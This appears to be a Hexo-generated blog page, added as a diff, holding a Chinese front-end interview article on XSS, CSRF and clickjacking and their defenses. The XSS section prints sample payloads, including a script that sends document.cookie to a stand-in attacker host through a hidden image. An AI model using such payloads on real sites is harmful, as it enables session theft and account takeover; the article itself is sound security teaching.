@@ -1,0 +1,839 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion">
+<head>
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-PBHRK7');</script>
+<!-- End Google Tag Manager -->
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="前端 知识 面试," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.2" />
+
+
+
+
+
+
+<meta name="description" content="XSS xss: 跨站脚本攻击（Cross Site Scripting）是最常见和基本的攻击 WEB 网站方法，攻击者通过注入非法的 html 标签或者 javascript 代码，从而当用户浏览该网页时，控制用户浏览器。  xss 主要分为三类： DOM xss  DOM即文本对象模型，DOM通常代表在html、xhtml和xml中的对象，使用DOM可以允许程序和脚本动态的访问和更新文档的内容">
+<meta name="keywords" content="前端 知识 面试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="前端面试题《第四篇》 前端安全">
+<meta property="og:url" content="http://wurh.github.io/2019/03/29/20190401/index.html">
+<meta property="og:site_name" content="华Ing&#39;s blog">
+<meta property="og:description" content="XSS xss: 跨站脚本攻击（Cross Site Scripting）是最常见和基本的攻击 WEB 网站方法，攻击者通过注入非法的 html 标签或者 javascript 代码，从而当用户浏览该网页时，控制用户浏览器。  xss 主要分为三类： DOM xss  DOM即文本对象模型，DOM通常代表在html、xhtml和xml中的对象，使用DOM可以允许程序和脚本动态的访问和更新文档的内容">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2019-07-12T06:10:38.190Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="前端面试题《第四篇》 前端安全">
+<meta name="twitter:description" content="XSS xss: 跨站脚本攻击（Cross Site Scripting）是最常见和基本的攻击 WEB 网站方法，攻击者通过注入非法的 html 标签或者 javascript 代码，从而当用户浏览该网页时，控制用户浏览器。  xss 主要分为三类： DOM xss  DOM即文本对象模型，DOM通常代表在html、xhtml和xml中的对象，使用DOM可以允许程序和脚本动态的访问和更新文档的内容">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://wurh.github.io/2019/03/29/20190401/"/>
+
+
+  <title> 前端面试题《第四篇》 前端安全 | 华Ing's blog </title>
+</head>
+
+<body itemscope itemtype="//schema.org/WebPage" lang="en">
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PBHRK7"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-69412379-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+  <script>
+  var _hmt = _hmt || [];
+  (function() {
+    var hm = document.createElement("script");
+    hm.src = "https://hm.baidu.com/hm.js?b3ddfb8655d8b77429e04c7a4d5bcbc1";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+  })();
+  </script>
+
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="//schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">华Ing's blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">harder and harder</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                前端面试题《第四篇》 前端安全
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Posted on</span>
+            <time itemprop="dateCreated" datetime="2019-03-29T10:20:00+08:00" content="2019-03-29">
+              2019-03-29
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/前端面试/" itemprop="url" rel="index">
+                    <span itemprop="name">前端面试</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2019/03/29/20190401/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2019/03/29/20190401/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><ul>
+<li>xss: 跨站脚本攻击（Cross Site Scripting）是最常见和基本的攻击 WEB 网站方法，攻击者通过注入非法的 html 标签或者 javascript 代码，从而当用户浏览该网页时，控制用户浏览器。</li>
+</ul>
+<h4 id="xss-主要分为三类："><a href="#xss-主要分为三类：" class="headerlink" title="xss 主要分为三类："></a>xss 主要分为三类：</h4><ul>
+<li><p>DOM xss </p>
+<p>DOM即文本对象模型，DOM通常代表在html、xhtml和xml中的对象，使用DOM可以允许程序和脚本动态的访问和更新文档的内容、结构和样式。它不需要服务器解析响应的直接参与，触发XSS靠的是浏览器端的DOM解析，可以认为完全是客户端的事情。</p>
+</li>
+<li><p>反射型 xss </p>
+<p>  反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。发出请求时，XSS代码出现在URL中，最后输入提交到服务器，服务器解析后在响应内容中出现这段XSS代码，最后浏览器解析执行。</p>
+</li>
+<li><p>存储型 xss</p>
+<p>  存储型XSS又被称为持久性XSS，它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为它不需要用户手动触发。 允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被XSS，其中最典型的例子就是留言板。</p>
+</li>
+</ul>
+<h4 id="跨站脚本攻击可能造成以下影响："><a href="#跨站脚本攻击可能造成以下影响：" class="headerlink" title="跨站脚本攻击可能造成以下影响："></a>跨站脚本攻击可能造成以下影响：</h4><pre><code>&gt; 利用虚假输入表单骗取用户个人信息。
+
+&gt; 利用脚本窃取用户的 Cookie 值，被害者在不知情的情况下，帮助攻击者发送恶意请求。
+
+&gt; 显示伪造的文章或图片。
+</code></pre><h4 id="存储型-xss-案例"><a href="#存储型-xss-案例" class="headerlink" title="存储型 xss 案例"></a>存储型 xss 案例</h4><p>在项目开发中，评论是个常见的功能，如果直接把评论的内容保存到数据库，那么显示的时候就可能被攻击。</p>
+<p>如果你只是想试试 xss，可以这样：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;font size=<span class="string">"100"</span> color=<span class="string">"red"</span>&gt;试试水&lt;<span class="regexp">/font&gt;</span></span><br></pre></td></tr></table></figure>
+<p>如果带点恶意，可以这样：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">      <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">          alert(<span class="string">'Hello'</span>)</span><br><span class="line">      &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>当然，最常见 xss 攻击是读取 Cookie：</p>
+<p>alert(document.cookie)</p>
+<p>Cookie 发送给攻击者的站点：</p>
+<p>var img = document.createElement(‘img’)<br>img.src=’<a href="http://www.xss.com?cookie=&#39;" target="_blank" rel="noopener">http://www.xss.com?cookie=&#39;</a> + document.cookie<br>img.style.display=’none’<br>document.getElementsByTagName(‘body’)[0].appendChild(img)</p>
+<p>当前用户的登录凭证存储于服务器的 session 中，而在浏览器中是以 cookie 的形式存储的。如果攻击者能获取到用户登录凭证的 Cookie，甚至可以绕开登录流程，直接设置这个 Cookie 值，来访问用户的账号。</p>
+<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><p>按理说，只要有输入数据的地方，就可能存在 XSS 危险。</p>
+<p>httpOnly: 在 cookie 中设置 HttpOnly 属性后，js脚本将无法读取到 cookie 信息。</p>
+<pre><code>ctx.cookies.set(name, value, {
+    httpOnly: true // 默认为 true
+})
+</code></pre><h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h4><blockquote>
+<p>输入检查，一般是用于对于输入格式的检查，例如：邮箱，电话号码，用户名，密码……等，按照规定的格式输入。</p>
+</blockquote>
+<blockquote>
+<p>不仅仅是前端负责，后端也要做相同的过滤检查。</p>
+</blockquote>
+<blockquote>
+<p>因为攻击者完全可以绕过正常的输入流程，直接利用相关接口向服务器发送设置。</p>
+</blockquote>
+<h4 id="HtmlEncode"><a href="#HtmlEncode" class="headerlink" title="HtmlEncode"></a>HtmlEncode</h4><p>某些情况下，不能对用户数据进行严格过滤，需要对标签进行转换</p>
+<p>当用户输入</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;script&gt;<span class="built_in">window</span>.location.href=”http:<span class="comment">//www.baidu.com”;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>最终保存结果为</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;script&gt;<span class="built_in">window</span>.location.href=<span class="string">"http://www.baidu.com"</span>&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在展现时，浏览器会对这些字符转换成文本内容，而不是一段可以执行的代码。</p>
+<h4 id="JavaScriptEncode"><a href="#JavaScriptEncode" class="headerlink" title="JavaScriptEncode"></a>JavaScriptEncode</h4><p>对下列字符加上反斜杠</p>
+<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>csrf：跨站点请求伪造（Cross-Site Request Forgeries），也被称为 one-click attack 或者 session riding。冒充用户发起请求（在用户不知情的情况下）， 完成一些违背用户意愿的事情（如修改用户信息，删初评论等）。</p>
+<h5 id="可能会造成以下影响："><a href="#可能会造成以下影响：" class="headerlink" title="可能会造成以下影响："></a>可能会造成以下影响：</h5><blockquote>
+<p>1.利用已通过认证的用户权限更新设定信息等；</p>
+</blockquote>
+<blockquote>
+<p>2.利用已通过认证的用户权限购买商品；</p>
+</blockquote>
+<blockquote>
+<p>3.利用已通过的用户权限在留言板上发表言论。</p>
+</blockquote>
+<p>一张图了解原理：</p>
+<p>简而言之：网站过分相信用户。</p>
+<h5 id="xss-区别"><a href="#xss-区别" class="headerlink" title="xss 区别"></a>xss 区别</h5><p>通常来说 CSRF 是由 XSS 实现的，CSRF 时常也被称为 XSRF（CSRF 实现的方式还可以是直接通过命令行发起请求等）。</p>
+<p>本质上讲，XSS 是代码注入问题，CSRF 是 HTTP 问题。XSS 是内容没有过滤导致浏览器将攻击者的输入当代码执行。CSRF 则是因为浏览器在发送 HTTP 请求时候自动带上 cookie，而一般网站的 session 都存在 cookie里面。</p>
+<h5 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h5><p>比如某网站的转账操作<br>受害者张三给李四转账100，<br>通过对银行的网站发起请求 <a href="http://bank.example/transfer?accout=张三&amp;a.." target="_blank" rel="noopener">http://bank.example/transfer?accout=张三&amp;a..</a>. ，<br>通常情况下，该请求发出后，服务器端会检查 session 是否合法，并且张三已经登录成功，<br>黑客王五可以自己给银行发送一个请求 <a href="http://bank.example/transfer?accout=张三&amp;a.." target="_blank" rel="noopener">http://bank.example/transfer?accout=张三&amp;a..</a>. ，但是这个请求来自王五，而不是张三，他并不能通过安全认证。他需要张三的 session 。<br>王五自己做了一个网站，放入如下代码 <a href="http://bank.example/transfer?accout=张三&amp;a.." target="_blank" rel="noopener">http://bank.example/transfer?accout=张三&amp;a..</a>. ，<br>用各种方式诱使张三点击自己的网站。<br>张三登录了银行的网站没有退出，访问了黑客王五的网站，上述的 url 就会向银行发起请求。<br>如果session没有过期，这时悲剧就发生了，张三的账户里少了1000。</p>
+<h5 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h5><p>验证码；强制用户必须与应用进行交互，才能完成最终请求。此种方式能很好的遏制 csrf，但是用户体验比较差。<br>尽量使用 post ，限制 get 使用；上一个例子可见，get 太容易被拿来做 csrf 攻击，但是 post 也并不是万无一失，攻击者只需要构造一个form就可以。<br>Referer check；请求来源限制，此种方法成本最低，但是并不能保证 100% 有效，因为服务器并不是什么时候都能取到 Referer，而且低版本的浏览器存在伪造 Referer 的风险。<br>token；token 验证的 CSRF 防御机制是公认最合适的方案。</p>
+<h5 id="整体思路如下："><a href="#整体思路如下：" class="headerlink" title="整体思路如下："></a>整体思路如下：</h5><p>第一步：后端随机产生一个 token，把这个token 保存到 session 状态中；同时后端把这个token 交给前端页面；<br>第二步：前端页面提交请求时，把 token 加入到请求数据或者头信息中，一起传给后端；<br>后端验证前端传来的 token 与 session 是否一致，一致则合法，否则是非法请求。<br>若网站同时存在 XSS 漏洞的时候，这个方法也是空谈。</p>
+<h3 id="Clickjacking"><a href="#Clickjacking" class="headerlink" title="Clickjacking"></a>Clickjacking</h3><ul>
+<li><p>Clickjacking： 点击劫持，是指利用透明的按钮或连接做成陷阱，覆盖在 Web 页面之上。然后诱使用户在不知情的情况下，点击那个连接访问内容的一种攻击手段。这种行为又称为界面伪装(UI Redressing) 。</p>
+</li>
+<li><p>大概有两种方式：</p>
+</li>
+</ul>
+<blockquote>
+<p>攻击者使用一个透明 iframe，覆盖在一个网页上，然后诱使用户在该页面上进行操作，此时用户将在不知情的情况下点击透明的 iframe 页面；</p>
+</blockquote>
+<blockquote>
+<p>攻击者使用一张图片覆盖在网页，遮挡网页原有的位置含义。</p>
+</blockquote>
+<hr>
+<h4 id="案例-1"><a href="#案例-1" class="headerlink" title="案例"></a>案例</h4><p>一张图了解</p>
+<h4 id="一般步骤"><a href="#一般步骤" class="headerlink" title="一般步骤"></a>一般步骤</h4><ul>
+<li>黑客创建一个网页利用 iframe 包含目标网站；</li>
+<li>隐藏目标网站，使用户无法无法察觉到目标网站存在；</li>
+<li>构造网页，诱变用户点击特点按钮</li>
+<li>用户在不知情的情况下点击按钮，触发执行恶意网页的命令。</li>
+</ul>
+<h4 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">X-FRAME-OPTIONS；</span><br><span class="line">X-FRAME-OPTIONS HTTP 响应头是用来给浏览器指示允许一个页面可否在&lt;frame&gt;, </span><br><span class="line"></span><br><span class="line">&lt;iframe&gt; 或者 &lt;object&gt; 中展现的标记。</span><br><span class="line"></span><br><span class="line">网站可以使用此功能，来确保自己网站内容没有被嵌到别人的网站中去，也从而避免点击劫持的攻击。</span><br></pre></td></tr></table></figure>
+<h4 id="有三个值："><a href="#有三个值：" class="headerlink" title="有三个值："></a>有三个值：</h4><ul>
+<li>DENY：表示页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。</li>
+<li>SAMEORIGIN：表示该页面可以在相同域名页面的 frame 中展示。</li>
+<li>ALLOW-FROM url：表示该页面可以在指定来源的 frame 中展示。</li>
+</ul>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="https://wurh.github.io/images/others/weixinshou.png" alt="华Ing WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="https://wurh.github.io/images/others/alifu.png" alt="华Ing Alipay"/>
+          <p>支付宝打赏</p>
+        </div>
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/前端-知识-面试/" rel="tag">#前端 知识 面试</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/29/20190331/" rel="next" title="前端面试《第三篇》HTTPS和HTTP2.0详解">
+                <i class="fa fa-chevron-left"></i> 前端面试《第三篇》HTTPS和HTTP2.0详解
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/03/30/20190402/" rel="prev" title="前端面试题《第五遍》前端算法">
+                前端面试题《第五遍》前端算法 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2019/03/29/20190401/"
+           data-title="前端面试题《第四篇》 前端安全" data-url="http://wurh.github.io/2019/03/29/20190401/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="//schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="https://wurh.github.io/images/avatar/logo.jpg?123456"
+               alt="华Ing" />
+          <p class="site-author-name" itemprop="name">华Ing</p>
+          <p class="site-description motion-element" itemprop="description">harder and harder</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">49</span>
+              <span class="site-state-item-name">posts</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">9</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">12</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/wurh" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/1674582564/profile?topnav=1&wvr=6" target="_blank" title="微博">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  微博
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.zhihu.com/people/wu-rong-hua-56" target="_blank" title="知乎">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  知乎
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://fsiaonma.github.io/" title="sam博客" target="_blank">sam博客</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://shenjoel.github.io/" title="joel博客" target="_blank">joel博客</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://firewood1122.github.io" title="firewood博客" target="_blank">firewood博客</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://reqianduan.com" title="热前端" target="_blank">热前端</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS"><span class="nav-number">1.</span> <span class="nav-text">XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#xss-主要分为三类："><span class="nav-number">1.1.</span> <span class="nav-text">xss 主要分为三类：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#跨站脚本攻击可能造成以下影响："><span class="nav-number">1.2.</span> <span class="nav-text">跨站脚本攻击可能造成以下影响：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#存储型-xss-案例"><span class="nav-number">1.3.</span> <span class="nav-text">存储型 xss 案例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#防御"><span class="nav-number">1.4.</span> <span class="nav-text">防御</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#过滤"><span class="nav-number">1.5.</span> <span class="nav-text">过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#HtmlEncode"><span class="nav-number">1.6.</span> <span class="nav-text">HtmlEncode</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JavaScriptEncode"><span class="nav-number">1.7.</span> <span class="nav-text">JavaScriptEncode</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF"><span class="nav-number">2.</span> <span class="nav-text">CSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#可能会造成以下影响："><span class="nav-number">2.0.1.</span> <span class="nav-text">可能会造成以下影响：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#xss-区别"><span class="nav-number">2.0.2.</span> <span class="nav-text">xss 区别</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#案例"><span class="nav-number">2.0.3.</span> <span class="nav-text">案例</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#防御-1"><span class="nav-number">2.0.4.</span> <span class="nav-text">防御</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#整体思路如下："><span class="nav-number">2.0.5.</span> <span class="nav-text">整体思路如下：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Clickjacking"><span class="nav-number">3.</span> <span class="nav-text">Clickjacking</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#案例-1"><span class="nav-number">3.1.</span> <span class="nav-text">案例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#一般步骤"><span class="nav-number">3.2.</span> <span class="nav-text">一般步骤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#防御-2"><span class="nav-number">3.3.</span> <span class="nav-text">防御</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#有三个值："><span class="nav-number">3.4.</span> <span class="nav-text">有三个值：</span></a></li></ol></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2013 - 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">华Ing</span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.2"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"wurh"};
+    (function() {
+      var ds = document.createElement('script');
